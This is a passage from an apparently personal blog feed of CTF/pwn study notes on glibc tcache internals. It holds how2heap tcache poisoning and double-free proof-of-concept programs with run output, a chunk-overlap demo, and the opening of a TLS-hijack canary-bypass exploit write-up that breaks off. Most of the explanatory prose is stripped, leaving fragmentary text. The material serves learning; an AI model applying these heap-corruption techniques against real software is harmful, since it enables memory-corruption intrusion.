style="zoom:80%;"><p>malloc0x90</p><p></p></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> House Of Spirit </tag>
            
            <tag> Unlink </tag>
            
            <tag> Tcache Attach </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tcache Poisoning &amp;&amp; Tcache Dup</title>
      <link href="/2023/03/27/Tcache_poisoning_dup/"/>
      <url>/2023/03/27/Tcache_poisoning_dup/</url>
      
        <content type="html"><![CDATA[<h2 id="Tcache-Poisoning"><a href="#Tcache-Poisoning" class="headerlink" title="Tcache Poisoning"></a>Tcache Poisoning</h2><p>how2heap tcache_poisoning.c</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// disable buffering</span></span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This file demonstrates a simple tcache poisoning attack by tricking malloc into\n&quot;</span></span><br><span class="line">           <span class="string">&quot;returning a pointer to an arbitrary location (in this case, the stack).\n&quot;</span></span><br><span class="line">           <span class="string">&quot;The attack is very similar to fastbin corruption attack.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;After the patch https://sourceware.org/git/?p=glibc.git;a=commit;h=77dc0d8643aa99c92bf671352b0a8adde705896f,\n&quot;</span></span><br><span class="line">           <span class="string">&quot;We have to create and free one more chunk for padding before fd pointer hijacking.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> stack_var;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;The address we want malloc() to return is %p.\n&quot;</span>, (<span class="type">char</span> *)&amp;stack_var);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Allocating 2 buffers.\n&quot;</span>);</span><br><span class="line">    <span class="type">intptr_t</span> *a = <span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;malloc(128): %p\n&quot;</span>, a);</span><br><span class="line">    <span class="type">intptr_t</span> *b = <span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;malloc(128): %p\n&quot;</span>, b);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Freeing the buffers...\n&quot;</span>);</span><br><span class="line">    <span class="built_in">free</span>(a);</span><br><span class="line">    <span class="built_in">free</span>(b);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now the tcache list has [ %p -&gt; %p ].\n&quot;</span>, b, a);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;We overwrite the first %lu bytes (fd/next pointer) of the data at %p\n&quot;</span></span><br><span class="line">           <span class="string">&quot;to point to the location to control (%p).\n&quot;</span>, <span class="keyword">sizeof</span>(<span class="type">intptr_t</span>), b, &amp;stack_var);</span><br><span class="line">    b[<span class="number">0</span>] = (<span class="type">intptr_t</span>)&amp;stack_var;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now the tcache list has [ %p -&gt; %p ].\n&quot;</span>, b, &amp;stack_var);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;1st malloc(128): %p\n&quot;</span>, <span class="built_in">malloc</span>(<span class="number">128</span>));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now the tcache list has [ %p ].\n&quot;</span>, &amp;stack_var);</span><br><span class="line"></span><br><span class="line">    <span class="type">intptr_t</span> *c = <span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;2nd malloc(128): %p\n&quot;</span>, c);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;We got the control\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    assert((<span class="type">long</span>)&amp;stack_var == (<span class="type">long</span>)c);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@grxer-virtual-machine /m/h/S/h/glibc_2.27&gt; ./tcache_poisoning</span><br><span class="line">This file demonstrates a simple tcache poisoning attack by tricking malloc into</span><br><span class="line">returning a pointer to an arbitrary location (in this case, the stack).</span><br><span class="line">The attack is very similar to fastbin corruption attack.</span><br><span class="line">After the patch https://sourceware.org/git/?p=glibc.git;a=commit;h=77dc0d8643aa99c92bf671352b0a8adde705896f,</span><br><span class="line">We have to create and free one more chunk for padding before fd pointer hijacking.</span><br><span class="line"></span><br><span class="line">The address we want malloc() to return is 0x7fffffffe448.</span><br><span class="line">Allocating 2 buffers.</span><br><span class="line">malloc(128): 0x603260</span><br><span class="line">malloc(128): 0x6032f0</span><br><span class="line">Freeing the buffers...</span><br><span class="line">Now the tcache list has [ 0x6032f0 -&gt; 0x603260 ].</span><br><span class="line">We overwrite the first 8 bytes (fd/next pointer) of the data at 0x6032f0</span><br><span class="line">to point to the location to control (0x7fffffffe448).</span><br><span class="line">Now the tcache list has [ 0x6032f0 -&gt; 0x7fffffffe448 ].</span><br><span class="line">1st malloc(128): 0x6032f0</span><br><span class="line">Now the tcache list has [ 0x7fffffffe448 ].</span><br><span class="line">2nd malloc(128): 0x7fffffffe448</span><br><span class="line">We got the control</span><br></pre></td></tr></table></figure><p>tachebinnext</p><p><img src="/2023/03/27/Tcache_poisoning_dup/image-20230327091111479.png" alt="image-20230327091111479"></p><p><img src="/2023/03/27/Tcache_poisoning_dup/image-20230327091058041.png" alt="image-20230327091058041"></p><p>2.26tcachesize</p><h2 id="Tcache-Dump"><a href="#Tcache-Dump" class="headerlink" title="Tcache Dump"></a>Tcache Dump</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This file demonstrates a simple double-free attack with tcache.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Allocating buffer.\n&quot;</span>);</span><br><span class="line">    <span class="type">int</span>* a = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;malloc(8): %p\n&quot;</span>, a);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Freeing twice...\n&quot;</span>);</span><br><span class="line">    <span class="built_in">free</span>(a);</span><br><span class="line">    <span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now the free list has [ %p, %p ].\n&quot;</span>, a, a);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Next allocated buffers will be same: [ %p, %p ].\n&quot;</span>, <span class="built_in">malloc</span>(<span class="number">8</span>), <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@grxer-virtual-machine /m/h/S/h/glibc_2.27&gt; ./tcache_dup</span><br><span class="line">This file demonstrates a simple double-free attack with tcache.</span><br><span class="line">Allocating buffer.</span><br><span class="line">malloc(8): 0x555555756260</span><br><span class="line">Freeing twice...</span><br><span class="line">free(): double free detected in tcache </span><br><span class="line">grxer@grxer:~$ ldd --version</span><br><span class="line">ldd (Ubuntu GLIBC 2.27-3ubuntu1.6) 2.27</span><br><span class="line">Copyright (C) 2018 Free Software Foundation, Inc.</span><br><span class="line">This is free software; see the source for copying conditions.  There is NO</span><br><span class="line">warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.</span><br><span class="line">Written by Roland McGrath and Ulrich Drepper.</span><br></pre></td></tr></table></figure><p>doublefree crash2.27libc2020.9.10 2.27-3Ubuntu1.3 glibc2.31patch</p><p><strong>unsortedbinoverlappingdoublefree</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> attack[<span class="number">15</span>] = <span class="string">&quot;6666666&quot;</span>;</span><br><span class="line">    <span class="type">void</span>* fill[<span class="number">7</span>];</span><br><span class="line">    <span class="type">void</span>* unsortbin;</span><br><span class="line">    <span class="type">void</span>* tcachebin;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">7</span>; i++)</span><br><span class="line">        fill[i] = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line">    unsortbin = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line">    tcachebin = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);<span class="comment">//topchunk</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">7</span>; i++)</span><br><span class="line">        <span class="built_in">free</span>(fill[i]);</span><br><span class="line">    <span class="built_in">free</span>(unsortbin);</span><br><span class="line">    <span class="built_in">free</span>(tcachebin);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line">    <span class="built_in">free</span>(tcachebin);</span><br><span class="line">    <span class="type">long</span>* ptr = <span class="built_in">malloc</span>(<span class="number">0xb0</span>);</span><br><span class="line">    ptr[<span class="number">18</span>] = &amp;attack;</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line">    ptr = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line">    <span class="built_in">puts</span>(attack);</span><br><span class="line">    <span class="built_in">strncpy</span>(ptr, <span class="string">&quot;hacker&quot;</span>,<span class="number">7</span>);</span><br><span class="line">    <span class="built_in">puts</span>(attack);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@grxer /m/h/S/h/glibc_2<span class="number">.27</span>&gt; ./tcache_dup</span><br><span class="line"><span class="number">6666666</span></span><br><span class="line">hacker</span><br></pre></td></tr></table></figure><p></p><p><img src="/2023/03/27/Tcache_poisoning_dup/image-20230327140326972.png" alt="image-20230327140326972"></p><p>0x90tcachebin7</p><p><code>free(unsortbin);</code></p><p>unsortedbin</p><p><img src="/2023/03/27/Tcache_poisoning_dup/image-20230327140512916.png" alt="image-20230327140512916"></p><p><code>free(tcachebin);</code></p><p><img src="/2023/03/27/Tcache_poisoning_dup/image-20230327140608610.png" alt="image-20230327140608610"></p><p>tcachebinchunk unsortedbinfreeunlink</p><p><img src="/2023/03/27/Tcache_poisoning_dup/image-20230327141113916.png" alt="image-20230327141113916"></p><p><code>malloc(0x80);</code></p><p>tcachebin</p><p><code>free(tcachebin);</code></p><p>tcachebintcachebin</p><p><img src="/2023/03/27/Tcache_poisoning_dup/image-20230327141335773.png" alt="image-20230327141335773"></p><p>chunkoverlapping </p><p><code>long* ptr = malloc(0xb0);</code></p><p><code>ptr[18] = &amp;attack;</code></p><p>unsortedbin,8*18&#x3D;0x90tcachebinnextattack<strong>tcache bin nextchunkdatafastbinchunk</strong></p><p><img src="/2023/03/27/Tcache_poisoning_dup/image-20230327142253602.png" alt="image-20230327142253602"></p><p><code>malloc(0x80);</code><br><code>ptr = malloc(0x80);</code></p><p>ptrattackcanaryattack[15]15(canary0),tcache_get<code>e-&gt;key = NULL;</code>canary</p>]]></content>
      
      
      
        <tags>
            
            <tag> Tcache Attach </tag>
            
            <tag> Tcache Poisoning </tag>
            
            <tag> Tcache Dup </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tcache</title>
      <link href="/2023/03/26/Tcache/"/>
      <url>/2023/03/26/Tcache/</url>
      
        <content type="html"><![CDATA[<h2 id="Tcache"><a href="#Tcache" class="headerlink" title="Tcache"></a>Tcache</h2><p><strong>Thread local caching</strong></p><p>Tcache  glibc <strong>2.26</strong> (ubuntu 17.10) ,</p><h2 id=""><a href="#" class="headerlink" title=""></a></h2><h3 id="tcache-entry"><a href="#tcache-entry" class="headerlink" title="tcache_entry"></a>tcache_entry</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* We overlay this structure on the user-data portion of a chunk when</span></span><br><span class="line"><span class="comment">   the chunk is stored in the per-thread cache.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125; tcache_entry;</span><br></pre></td></tr></table></figure><p>nextfree chunkdatabinchunk <strong>LIFO</strong></p><p><strong>2.29</strong>  tcache_entry keydoublefree </p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line"><span class="comment">/* This field exists to detect double frees.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span> *<span class="title">key</span>;</span></span><br><span class="line">&#125; tcache_entry;</span><br></pre></td></tr></table></figure><p><strong>glibc 2.32</strong>next</p><h3 id="tcache-perthread-struct"><a href="#tcache-perthread-struct" class="headerlink" title="tcache_perthread_struct"></a>tcache_perthread_struct</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* There is one of these for each thread, which contains the</span></span><br><span class="line"><span class="comment">   per-thread cache (hence &quot;tcache_perthread_struct&quot;).  Keeping</span></span><br><span class="line"><span class="comment">   overall size low is mildly important.  Note that COUNTS and ENTRIES</span></span><br><span class="line"><span class="comment">   are redundant (we could have just counted the linked list each</span></span><br><span class="line"><span class="comment">   time), this is for performance reasons.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">char</span> counts[TCACHE_MAX_BINS];</span><br><span class="line">  tcache_entry *entries[TCACHE_MAX_BINS];</span><br><span class="line">&#125; tcache_perthread_struct;</span><br><span class="line"></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> TCACHE_MAX_BINS                64</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> __thread tcache_perthread_struct *tcache = <span class="literal">NULL</span>;</span><br></pre></td></tr></table></figure><p> thread  <code>tcache_perthread_struct</code>,,tcache</p><p><code>counts</code>  <code>tcache_entry</code>  chunk  7  chunk</p><p>TCACHE_MAX_BINS 64tcache bin0x20-0x410 0x10</p><h2 id="Tcache-how-2-work"><a href="#Tcache-how-2-work" class="headerlink" title="Tcache how 2 work"></a>Tcache how 2 work</h2><ol><li>malloctcache_perthread_structtcache </li><li>freesize&lt;0x410(64chunke head)tcache7tcacehfastbinbininuse</li><li>malloctcachetcachetcache<code>fastbin/smallbin/unsorted bin</code>  size  chunk <code>fastbin/smallbin/unsorted bin</code>  chunk  tcache  tcache <strong> chunk  bin  tcache </strong></li></ol><h2 id="RTFSC"><a href="#RTFSC" class="headerlink" title="RTFSC"></a>RTFSC</h2><h3 id=""><a href="#" class="headerlink" title=""></a></h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">  <span class="comment">//  tcache list </span></span><br><span class="line">  <span class="keyword">if</span> (tc_idx &lt; mp_.tcache_bins <span class="comment">// tc_idx size  idx </span></span><br><span class="line">      <span class="comment">/*&amp;&amp; tc_idx &lt; TCACHE_MAX_BINS*/</span> <span class="comment">/* to appease gcc */</span></span><br><span class="line">      &amp;&amp; tcache</span><br><span class="line">      &amp;&amp; tcache-&gt;entries[tc_idx] != <span class="literal">NULL</span>) <span class="comment">//  tcache </span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">return</span> tcache_get (tc_idx);</span><br><span class="line">    &#125;</span><br><span class="line">  DIAG_POP_NEEDS_COMMENT;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  <span class="comment">//  tcache </span></span><br><span class="line">  <span class="keyword">if</span> (SINGLE_THREAD_P)</span><br><span class="line">    &#123;</span><br><span class="line">      victim = _int_malloc (&amp;main_arena, bytes);</span><br><span class="line">      assert (!victim || chunk_is_mmapped (mem2chunk (victim)) ||</span><br><span class="line">              &amp;main_arena == arena_for_chunk (mem2chunk (victim)));</span><br><span class="line">      <span class="keyword">return</span> victim;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>tcache-&gt;entries[tc_idx]tcache_get(tc_idx)</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Caller must ensure that we know tc_idx is valid and there&#x27;s</span></span><br><span class="line"><span class="comment">   available chunks to remove.  */</span></span><br><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span> *</span><br><span class="line"><span class="title function_">tcache_get</span> <span class="params">(<span class="type">size_t</span> tc_idx)</span></span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = tcache-&gt;entries[tc_idx];<span class="comment">//tcacehchunk</span></span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS); <span class="comment">//index</span></span><br><span class="line">  assert (tcache-&gt;entries[tc_idx] &gt; <span class="number">0</span>); <span class="comment">//tcache bin</span></span><br><span class="line">  tcache-&gt;entries[tc_idx] = e-&gt;next;<span class="comment">//tcache binchunk</span></span><br><span class="line">  --(tcache-&gt;counts[tc_idx]); <span class="comment">//  chunkcounts </span></span><br><span class="line">  <span class="keyword">return</span> (<span class="type">void</span> *) e;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p></p><p><strong>glibc2.32</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span> *</span><br><span class="line"> <span class="title function_">tcache_get</span> <span class="params">(<span class="type">size_t</span> tc_idx)</span></span><br><span class="line"> &#123;</span><br><span class="line">   tcache_entry *e = tcache-&gt;entries[tc_idx];</span><br><span class="line">   <span class="keyword">if</span> (__glibc_unlikely (!aligned_OK (e)))</span><br><span class="line">     malloc_printerr (<span class="string">&quot;malloc(): unaligned tcache chunk detected&quot;</span>);</span><br><span class="line">   tcache-&gt;entries[tc_idx] = REVEAL_PTR (e-&gt;next);</span><br><span class="line">   --(tcache-&gt;counts[tc_idx]);</span><br><span class="line">   e-&gt;key = <span class="literal">NULL</span>;</span><br><span class="line">   <span class="keyword">return</span> (<span class="type">void</span> *) e;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> PROTECT_PTR(pos, ptr) \</span></span><br><span class="line"><span class="meta">((__typeof (ptr)) ((((size_t) pos) &gt;&gt; 12) ^ ((size_t) ptr)))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> REVEAL_PTR(ptr)  PROTECT_PTR (&amp;ptr, ptr)</span></span><br></pre></td></tr></table></figure><p>xor2.32nextPROTECT_PTRnext12next(chunk)tcache structfastbin attachchunk</p><h2 id=""><a href="#" class="headerlink" title=""></a></h2><p>_int_free()</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line">_int_free (mstate av, mchunkptr p, <span class="type">int</span> have_lock)</span><br><span class="line">&#123;</span><br><span class="line">  ......</span><br><span class="line">  ......</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="type">size_t</span> tc_idx = csize2tidx (size);</span><br><span class="line">    <span class="keyword">if</span> (tcache</span><br><span class="line">        &amp;&amp; tc_idx &lt; mp_.tcache_bins <span class="comment">// 64</span></span><br><span class="line">        &amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count) <span class="comment">// mp_.tcache_count=7</span></span><br><span class="line">      &#123;</span><br><span class="line">        tcache_put (p, tc_idx);  <span class="comment">//pchunktc_idxsizeentries</span></span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  ......</span><br><span class="line">  ......</span><br></pre></td></tr></table></figure><p> <code>tc_idx</code> <code>tcache-&gt;counts[tc_idx]</code>  7  <code>tcache_put()</code></p><p>tcache_put()</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Caller must ensure that we know tc_idx is valid and there&#x27;s room</span></span><br><span class="line"><span class="comment">   for more chunks.  */</span></span><br><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span></span><br><span class="line"><span class="title function_">tcache_put</span> <span class="params">(mchunkptr chunk, <span class="type">size_t</span> tc_idx)</span> <span class="comment">//chunkchunktc_idxsizeentries</span></span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);<span class="comment">//chunktcache_entry </span></span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);<span class="comment">//64</span></span><br><span class="line">  e-&gt;next = tcache-&gt;entries[tc_idx];<span class="comment">//chunknextsizechunk</span></span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;<span class="comment">//chunk tcache_perthread_struct</span></span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);<span class="comment">//++size</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p></p><p><strong>glibc2.29</strong>key</p><p>_int_free key  tcache free tcache_entry double free</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (__glibc_unlikely (e-&gt;key == tcache))</span><br><span class="line">&#123;</span><br><span class="line">    tcache_entry *tmp;</span><br><span class="line">    LIBC_PROBE (memory_tcache_double_free, <span class="number">2</span>, e, tc_idx);</span><br><span class="line">    <span class="keyword">for</span> (tmp = tcache-&gt;entries[tc_idx];</span><br><span class="line">         tmp;</span><br><span class="line">         tmp = tmp-&gt;next)</span><br><span class="line">        <span class="keyword">if</span> (tmp == e)        </span><br><span class="line">            malloc_printerr (<span class="string">&quot;free(): double free detected in tcache 2&quot;</span>);</span><br><span class="line"><span class="comment">/* If we get here, it was a coincidence.  We&#x27;ve wasted a</span></span><br><span class="line"><span class="comment">few cycles, but don&#x27;t abort.  */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>glibc2.32</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Caller must ensure that we know tc_idx is valid and there&#x27;s room</span></span><br><span class="line"><span class="comment">for more chunks.  */</span></span><br><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span></span><br><span class="line"><span class="title function_">tcache_put</span> <span class="params">(mchunkptr chunk, <span class="type">size_t</span> tc_idx)</span></span><br><span class="line">&#123;</span><br><span class="line">tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Mark this chunk as &quot;in the tcache&quot; so the test in _int_free will</span></span><br><span class="line"><span class="comment">  detect a double free.  */</span></span><br><span class="line">e-&gt;key = tcache;</span><br><span class="line"></span><br><span class="line">e-&gt;next = PROTECT_PTR (&amp;e-&gt;next, tcache-&gt;entries[tc_idx]);</span><br><span class="line">tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> PROTECT_PTR(pos, ptr) \</span></span><br><span class="line"><span class="meta">((__typeof (ptr)) ((((size_t) pos) &gt;&gt; 12) ^ ((size_t) ptr)))</span></span><br></pre></td></tr></table></figure><p>PROTECT_PTR chunktcache_entrynextnextnextchunkdata</p><p></p><p><img src="/2023/03/26/Tcache/image-20230326234600469.png" alt="image-20230326234600469"></p><p>pwndbg</p><p><img src="/2023/03/26/Tcache/image-20230326234343508.png" alt="image-20230326234343508"></p><p>0x55500000c6d9 0x555555559380 xor 0x555555559&#x3D;0x55500000C6D9</p>]]></content>
      
      
      
        <tags>
            
            <tag> Tcache Attach </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>TLScanary(TLS Hijack Bypass Canary)</title>
      <link href="/2023/03/26/TLS-Hijack/"/>
      <url>/2023/03/26/TLS-Hijack/</url>
      
        <content type="html"><![CDATA[<p><a href="https://pan.baidu.com/s/173QtGe1It9EX2OiocC0ZBw">https://pan.baidu.com/s/173QtGe1It9EX2OiocC0ZBw</a><br>1pcz</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@grxer ~/D/pwn&gt; checksec checkin </span><br><span class="line">[*] &#x27;/home/grxer/Desktop/pwn/checkin&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p></p><p>flagbss</p><p>pthread_createstart_routine</p><p>pthread_join()</p><p>canarySSP(Stack Smashing Protect)Leakargv[0](__libc_argv)flagcanaryflag</p><h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>pthread_create()</p><ol><li></li><li></li><li></li><li>bssdata</li><li>malloccalloc</li><li>pthread_key_create()Thread-specific dataTSD</li></ol><p><strong>Linux</strong></p><p></p><ol><li></li><li></li><li></li></ol><p></p><ol><li></li><li></li><li>IPC</li></ol><h2 id="Thread-Local-Storage"><a href="#Thread-Local-Storage" class="headerlink" title="Thread Local Storage"></a>Thread Local Storage</h2><p><a href="https://gcc.gnu.org/onlinedocs/gcc/Thread-Local.html">https://gcc.gnu.org/onlinedocs/gcc/Thread-Local.html</a></p><p>TLS</p><p>gcc__threadTLS</p><p>TLSThread Local StorageTLScanaryTLSstack</p><p><strong>TLSmmapmmapTLS</strong></p><p><strong>tcbhead_t</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">        <span class="type">void</span> *tcb;        <span class="comment">/* Pointer to the TCB.  Not necessarily the</span></span><br><span class="line"><span class="comment">                             thread descriptor used by libpthread.  */</span></span><br><span class="line">        <span class="type">dtv_t</span> *dtv;</span><br><span class="line">        <span class="type">void</span> *self;        <span class="comment">/* Pointer to the thread descriptor.  */</span></span><br><span class="line">        <span class="type">int</span> multiple_threads;</span><br><span class="line">        <span class="type">int</span> gscope_flag;</span><br><span class="line">        <span class="type">uintptr_t</span> sysinfo;</span><br><span class="line">        <span class="type">uintptr_t</span> stack_guard;   <span class="comment">/* canary0x28 */</span></span><br><span class="line">        <span class="type">uintptr_t</span> pointer_guard;</span><br><span class="line">        </span><br><span class="line">&#125; <span class="type">tcbhead_t</span>;</span><br></pre></td></tr></table></figure><h3 id="gdb"><a href="#gdb" class="headerlink" title="gdb"></a>gdb</h3><p>set follow-fork-mode child</p><p>show follow-fork-mode </p><p>(1)info threads</p><p>(2)thread id</p><p>(3)set scheduler-locking on</p><p>(4)set scheduler-locking off</p><p>(5)gdbthread apply id gdb_cmd</p><p>(6)gdbthread apply all gdb_cmd</p><p><strong>x&#x2F;x pthread_self()fsbase</strong>fs</p><p></p><p><img src="/2023/03/26/TLS-Hijack/image-20230326174219767.png" alt="image-20230326174219767"></p><p>distancecanarystack_guard,rop putsflag</p><p><img src="/2023/03/26/TLS-Hijack/image-20230326174414780.png" alt="image-20230326174414780"></p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span 